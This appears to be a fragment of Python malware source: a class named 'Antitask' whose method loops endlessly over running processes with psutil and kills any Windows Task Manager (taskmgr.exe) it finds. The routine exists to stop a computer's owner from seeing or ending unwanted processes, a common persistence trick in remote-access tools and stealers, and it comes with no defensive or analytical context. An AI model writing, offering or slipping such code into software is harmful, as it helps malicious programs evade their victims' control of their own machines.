import psutil
class Antitask:
    def task():
        while True:
          for proc in psutil.process_iter():
            if proc.name().lower() == 'taskmgr.exe':
              proc.terminate()
